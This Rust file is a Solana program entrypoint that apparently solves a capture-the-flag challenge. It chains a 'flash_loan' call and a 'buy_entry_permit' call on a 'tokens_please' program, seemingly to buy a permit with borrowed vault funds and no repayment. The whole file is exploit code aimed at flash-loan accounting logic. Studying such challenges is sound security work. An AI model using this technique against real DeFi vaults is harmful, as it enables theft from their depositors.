#[cfg(not(feature = "no-entrypoint"))]
pub mod entrypoint {
    use anchor_lang::prelude::*;
    use solana_program::{account_info::AccountInfo, entrypoint, entrypoint::ProgramResult};
    use tokens_please::cpi::{self, accounts};

    entrypoint!(process_instruction);

    pub fn process_instruction(
        _program_id: &Pubkey,
        accounts: &[AccountInfo],
        _instruction_data: &[u8],
    ) -> ProgramResult {
        let user = &accounts[0];
        let user_permit = &accounts[1];
        let vault = &accounts[2];
        let prog = &accounts[3];
        let instruction_program = &accounts[4];
        let system_program = &accounts[5];
        cpi::flash_loan(CpiContext::new(
            prog.clone(),
            accounts::FlashLoan {
                user: user.clone(),
                vault: vault.clone(),
                system_program: system_program.clone(),
                instruction_program: instruction_program.clone(),
            },
        ))?;
        cpi::buy_entry_permit(CpiContext::new(
            prog.clone(),
            accounts::BuyEntryPermit {
                user: user.clone(),
                vault: vault.clone(),
                permit: user_permit.clone(),
                system_program: system_program.clone(),
            },
        ))?;
        Ok(())
    }
}
